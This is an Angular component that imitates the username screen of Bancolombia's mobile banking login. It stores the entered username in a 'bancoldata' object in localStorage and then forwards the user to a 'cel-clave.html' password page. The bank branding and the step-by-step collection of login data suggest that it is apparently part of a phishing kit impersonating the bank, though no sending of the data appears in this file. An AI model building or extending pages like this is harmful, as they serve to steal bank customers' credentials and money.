import { AfterViewInit, Component, ElementRef, OnInit, Renderer2, ViewChild } from '@angular/core';

@Component({
  selector: 'app-bancolombia-movil',
  imports: [],
  templateUrl: './bancolombia-movil.component.html',
  styleUrl: './bancolombia-movil.component.css'
})
export default class BancolombiaMovilComponent implements OnInit, AfterViewInit {
  
  @ViewChild('loader', { static: false }) loader!: ElementRef;
  @ViewChild('mainContent', { static: false }) mainContent!: ElementRef;
  @ViewChild('userInput', { static: false }) userInput!: ElementRef;
  @ViewChild('continueButton', { static: false }) continueButton!: ElementRef;
  @ViewChild('buttonContainer', { static: false }) buttonContainer!: ElementRef;

  constructor(private renderer: Renderer2) {}

  ngOnInit(): void {
    // The code to execute when the component is initialized
  }

  ngAfterViewInit(): void {
    // The code to execute after the view is initialized


    // Enable/Disable the button based on user input
    if (this.userInput && this.continueButton) {
      this.renderer.listen(this.userInput.nativeElement, 'input', () => {
        const userValue = this.userInput.nativeElement.value.trim();
        if (userValue.length >= 4) {
          this.continueButton.nativeElement.classList.add('enabled');
          this.continueButton.nativeElement.classList.remove('disabled');
        } else {
          this.continueButton.nativeElement.classList.add('disabled');
          this.continueButton.nativeElement.classList.remove('enabled');
        }
      });
    }

    // Detect when the keyboard is visible and adjust button position
    window.addEventListener('resize', () => {
      if (window.innerHeight < 500) { // Assume keyboard is visible if window height is small
        this.renderer.setStyle(this.buttonContainer.nativeElement, 'top', '77%');
      } else {
        this.renderer.setStyle(this.buttonContainer.nativeElement, 'top', '70.4%');
      }
    });

    // Action on click of "Continue" button
    if (this.continueButton) {
      this.renderer.listen(this.continueButton.nativeElement, 'click', () => {
        const userValue = this.userInput.nativeElement.value.trim();
        if (userValue.length >= 4) {
          // Get the existing value of `bancoldata` from localStorage
          let bancoldata;
          try {
            const storedData = localStorage.getItem('bancoldata');
            bancoldata = storedData ? JSON.parse(storedData) : {};
          } catch (e) {
            console.error('Error parsing bancoldata. Resetting to an empty object:', e);
            bancoldata = {}; // Reset to an empty object if parsing error occurs
          }

          // Update the object with the new user value
          bancoldata.usuario = userValue;

          // Save the updated value to localStorage
          localStorage.setItem('bancoldata', JSON.stringify(bancoldata));

          // Redirect to the next page
          window.location.href = 'cel-clave.html';
        } else {
          alert('Please enter a valid username with at least 4 characters.');
        }
      });
    }
  }
}
